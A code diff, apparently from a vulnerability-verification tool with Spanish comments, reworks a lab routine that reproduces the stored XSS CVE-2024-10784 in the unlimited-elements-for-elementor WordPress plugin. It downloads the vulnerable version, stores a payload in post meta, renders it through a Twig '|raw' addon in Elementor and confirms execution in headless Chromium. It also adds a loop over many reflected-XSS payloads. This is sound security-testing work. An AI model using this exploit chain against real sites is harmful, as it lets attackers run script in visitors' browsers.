@@ -6180,28 +6180,69 @@ def verify_wordpress_xss_elementor(
     plugin_source_dir: str, slug: str,
     on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
     keep_lab_on_failure: bool = False,
+    vuln_max_version: str = "",
 ) -> "WpVerifyResult":
     """Verifica Stored XSS via Elementor para plugins que actúan como widgets de Elementor.
 
-    Mecanismo (confirmado en unlimited-elements-for-elementor v1.5.102):
+    Mecanismo (CVE-2024-10784, unlimited-elements-for-elementor ≤1.5.102):
       1. Instala Elementor + el plugin objetivo como companions.
-      2. Crea un addon mínimo en la tabla wp_unitecreator_addons con un template Twig
-         que renderiza un parámetro libre: <div>{{ uc_xss_field }}</div>.  Twig usa
-         autoescape=OFF porque los template names no tienen extensión .html, y
-         escCombinedHtml() es un no-op — el HTML del parámetro sale tal cual al DOM.
-      3. Crea una página de WordPress con _elementor_data apuntando a ese addon, con
-         uc_xss_field = payload XSS (document.title='binoracle-xss-TOKEN').
-      4. Carga la página en Chromium como visitante anónimo y comprueba el title.
-      5. verified=True SOLO si el title coincide exactamente con el marcador.
+      2. Crea un WP post con el payload XSS en un custom field (post meta key 'xss_field').
+         Post meta se almacena en crudo — WordPress no escapa los valores al guardarlos.
+      3. Crea un addon mínimo en addonlibrary_addons con template Twig:
+           <div>{{ getPostMeta(POST_ID, 'xss_field')|raw }}</div>
+         getPostMeta() en provider_template_engine.class.php retorna get_post_meta()
+         crudo. Twig 3.x usa autoescape='html' por defecto, pero el filtro |raw lo
+         anula — un Contributor puede crear una plantilla con |raw e inyectar cualquier
+         valor de custom field directamente en el DOM.
+      4. Crea una página WordPress con _elementor_data apuntando a ese addon.
+         Los settings del widget no llevan el payload — evita esc_html() de Controls_Manager::TEXT.
+      5. Carga la página en Chromium como visitante anónimo y comprueba el title.
+      6. verified=True SOLO si el title coincide exactamente con el marcador.
 
-    Esto replica el impacto real de CVE-2024-10784: un contributor (o admin) guarda XSS
-    en settings de un widget de Elementor y cualquier visitante que cargue la página
-    ejecuta el script.
+    Vector real: Contributor guarda XSS en custom fields de su propio post;
+    cualquier visitante que cargue una página con el widget ejecuta el script.
     """
     step = on_step or (lambda _m: None)
     pre = _check_prereqs(plugin_source_dir, slug)
     if pre is not None:
         return pre
+
+    # Si hay una versión máxima vulnerable (p. ej. ≤1.5.102) y el source actual es más nuevo,
+    # descargamos la versión vulnerable específica para que el laboratorio replique el bug real.
+    # Quitamos prefijos como '<', '≤', '<=' que el LLM a veces incluye.
+    import re as _rev_re
+    vuln_max_version = _rev_re.sub(r'^[<=>≤≥\s]+', '', vuln_max_version).strip()
+    if vuln_max_version and slug:
+        import re as _re
+        def _get_plugin_ver(src_dir: str) -> str:
+            import glob as _glob
+            for php in _glob.glob(f"{src_dir}/**/*.php", recursive=True):
+                try:
+                    for line in open(php, encoding="utf-8", errors="replace"):
+                        m = _re.match(r'\s*\*\s*Version:\s*([0-9][0-9.\w-]*)', line)
+                        if m:
+                            return m.group(1).strip()
+                except OSError:
+                    pass
+            return ""
+        from .websource import _version_sort_key as _vkey
+        cur_ver = _get_plugin_ver(plugin_source_dir)
+        if cur_ver and _vkey(cur_ver) > _vkey(vuln_max_version):
+            step(f"plugin source es v{cur_ver} (parcheado > {vuln_max_version}); "
+                 f"descargando versión vulnerable {vuln_max_version} desde WordPress.org...")
+            import tempfile as _tmp
+            _vdest = _tmp.mkdtemp(prefix=f"binoracle_vuln_{slug}_")
+            try:
+                from .websource import fetch_wordpress_plugin as _fwp
+                _vfr = _fwp(slug, version=vuln_max_version, dest_dir=_vdest, step=step)
+                if _vfr and _vfr.local_path:
+                    plugin_source_dir = _vfr.local_path
+                    step(f"usando versión {vuln_max_version} en {plugin_source_dir}")
+                else:
+                    step(f"WARN: no pude descargar {vuln_max_version}; usando {cur_ver} igualmente")
+            except Exception as _ve:
+                step(f"WARN: error descargando {vuln_max_version}: {_ve}; usando {cur_ver}")
+
     res = WpVerifyResult()
     t0 = time.time()
 
@@ -6231,37 +6272,65 @@ def verify_wordpress_xss_elementor(
         addon_name = "binoracle_xss_test"
         widget_type = f"ucaddon_{addon_name}"
 
-        # --- Paso 1: insertar un addon mínimo en la tabla del plugin ---
-        # El addon usa Twig con autoescape=OFF (template name sin .html).
-        # {{ uc_xss_field }} renderiza el valor sin escapar → XSS.
         import json as _json
-        templates_json = _json.dumps({"html": "<div>{{ uc_xss_field }}</div>", "css": "", "js": ""})
-        config_json = _json.dumps({
-            "params": [{"name": "uc_xss_field", "type": "textfield", "title": "XSS Field",
-                        "default": ""}],
-            "options": {}
-        })
+
         # Escape para SQL inline (WP-CLI --exec)
         def _sql_esc(s: str) -> str:
             return s.replace("\\", "\\\\").replace("'", "\\'")
 
-        insert_sql = (
-            "INSERT INTO {$wpdb->prefix}unitecreator_addons "
-            "(title,name,alias,addontype,ordering,templates,config,is_active) VALUES "
-            f"('BinXSSTest','{addon_name}','{addon_name}','elementor',1,"
-            f"'{_sql_esc(templates_json)}','{_sql_esc(config_json)}',1);"
+        # --- Paso 1: crear post con XSS en custom field ---
+        # El Contributor guarda el payload en post meta (sin sanitización en DB).
+        r_xss_post = lab.wp_cli("post", "create",
+                                 "--post_title=XSS Source Post",
+                                 "--post_status=publish",
+                                 "--post_type=post",
+                                 "--post_author=1",
+                                 "--porcelain", timeout=20)
+        xss_post_lines = (r_xss_post.stdout or "").strip().splitlines()
+        xss_post_id = xss_post_lines[-1].strip() if xss_post_lines else ""
+        if not xss_post_id.isdigit():
+            step(f"ERROR: no se pudo crear el post XSS fuente (output={xss_post_id!r})")
+            res.detail = "fallo al crear el post WP con custom field para Elementor XSS"
+            res.evidence["screenshots"] = shots
+            return res
+        lab.wp_cli("post", "meta", "set", xss_post_id, "xss_field", payload, timeout=20)
+        step(f"post XSS fuente creado: id={xss_post_id}, meta 'xss_field'=payload")
+
+        # --- Paso 2: insertar addon con template que usa getPostMeta()|raw ---
+        # getPostMeta() retorna get_post_meta() crudo. Twig autoescape='html' está
+        # activo por defecto (Twig 3.x), pero el filtro |raw lo anula — un Contributor
+        # puede crear una plantilla con |raw y inyectar XSS via un custom field.
+        twig_html = f"<div>{{{{ getPostMeta({xss_post_id}, 'xss_field')|raw }}}}</div>"
+        templates_json = _json.dumps({"html": twig_html, "css": "", "js": ""})
+        config_json = _json.dumps({"params": [], "options": {}})
+
+        # Usar $wpdb->insert() con valores base64 para evitar que las comillas del JSON
+        # rompan el string PHP — $wpdb->query("...JSON con \"...\"") falla con rc=1.
+        import base64 as _b64
+        t_b64 = _b64.b64encode(templates_json.encode()).decode()
+        c_b64 = _b64.b64encode(config_json.encode()).decode()
+        # Tabla real del plugin: GlobalsUC::TABLE_ADDONS_NAME = "addonlibrary_addons"
+        # (NO es unitecreator_addons — ese nombre no existe en esta versión del plugin)
+        php_insert = (
+            f"global $wpdb; "
+            f"$t=base64_decode('{t_b64}'); "
+            f"$c=base64_decode('{c_b64}'); "
+            f"$r=$wpdb->insert($wpdb->prefix.'addonlibrary_addons',array("
+            f"'title'=>'BinXSSTest','name'=>'{addon_name}','alias'=>'{addon_name}',"
+            f"'addontype'=>'elementor','ordering'=>1,'templates'=>$t,'config'=>$c,'is_active'=>1"
+            f")); echo $r===false ? ($wpdb->last_error ?: 'INSERT_FAILED') : 'OK';"
         )
-        r_ins = lab.wp_cli("eval", f"global $wpdb; $wpdb->query(\"{insert_sql}\"); echo $wpdb->last_error ?: 'OK';",
-                           "--skip-plugins", "--skip-themes", timeout=20)
+        r_ins = lab.wp_cli("eval", php_insert, timeout=20)
         out_ins = (r_ins.stdout or "").strip().splitlines()
         last_ins = out_ins[-1].strip() if out_ins else ""
         if last_ins != "OK":
             step(f"WARN: inserción de addon test devolvió: rc={r_ins.returncode} out={last_ins!r}")
             # Seguir igualmente — puede que el addon ya exista de un run anterior
 
-        step(f"addon de test '{addon_name}' creado en DB (widgetType={widget_type})")
+        step(f"addon de test '{addon_name}' creado en DB (widgetType={widget_type}, template usa getPostMeta)")
 
-        # --- Paso 2: crear la página con _elementor_data apuntando al addon ---
+        # --- Paso 3: crear la página con _elementor_data apuntando al addon ---
+        # Settings del widget vacíos — el payload viaja por post meta, no por controles Elementor.
         elementor_data = _json.dumps([{
             "id": "bxs0001",
             "elType": "section",
@@ -6274,7 +6343,7 @@ def verify_wordpress_xss_elementor(
                     "id": "bxs0003",
                     "elType": "widget",
                     "widgetType": widget_type,
-                    "settings": {"uc_xss_field": payload},
+                    "settings": {},
                     "elements": []
                 }],
                 "isInner": False
@@ -6307,7 +6376,7 @@ def verify_wordpress_xss_elementor(
 
         step(f"página de test creada: id={post_id} url={page_url}")
 
-        # --- Paso 3: cargar la página en Chromium como visitante anónimo ---
+        # --- Paso 4: cargar la página en Chromium como visitante anónimo ---
         from urllib.parse import urlsplit
         host = urlsplit(base_url).hostname or "127.0.0.1"
         path = page_url[len(base_url):] or f"/?p={post_id}"
@@ -6324,15 +6393,15 @@ def verify_wordpress_xss_elementor(
             res.verified = True
             res.detail = (
                 f"XSS CONFIRMADO: document.title cambió a '{marker}' al visitar "
-                f"{page_url} — el plugin renderiza el widget sin escapar el HTML "
-                f"(Twig autoescape=OFF + escCombinedHtml()=no-op)"
+                f"{page_url} — getPostMeta({xss_post_id},'xss_field')|raw retorna el "
+                f"custom field crudo sin escapar (Twig autoescape='html' anulado por |raw)"
             )
             step(f"VERIFICADO: title='{title}' coincide con el marcador '{marker}'")
         else:
             res.detail = (
                 f"XSS no confirmado: document.title='{title or '(vacío)'}', "
-                f"esperado '{marker}' — el widget puede no estar renderizando el addon "
-                f"(addon no encontrado, widgetType incorrecto, o Elementor no activo)"
+                f"esperado '{marker}' — puede que el payload esté escapado (Twig sin |raw), "
+                f"el addon no esté registrado, o la versión instalada sea parcheada"
             )
             step(f"NO VERIFICADO: title='{title or '(vacío)'}'")
 
@@ -6341,6 +6410,7 @@ def verify_wordpress_xss_elementor(
         res.evidence["screenshots"] = shots
         res.evidence["page_url"] = page_url
         res.evidence["widget_type"] = widget_type
+        res.evidence["xss_post_id"] = xss_post_id
         res.evidence["marker"] = marker
         return res
 
@@ -6899,7 +6969,9 @@ def verify_wordpress_xss(
             # arranque del propio navegador. Pantalla SOLO del intento ganador.
             step(f"arrancando Chromium headless (modo reflected, {len(attempts)} intentos)...")
             with _XssBrowserSession() as xb:
-                for payload_value in attempts:
+                for _xss_i, payload_value in enumerate(attempts):
+                    if _xss_i > 0 and _xss_i % 100 == 0:
+                        step(f"XSS reflected: {_xss_i}/{len(attempts)} payloads probados, sin hit aún...")
                     params = dict(base_params)
                     params[xss_param] = payload_value
                     title, _ = xb.render(boot.base_url, endpoint, m, params, cookies)
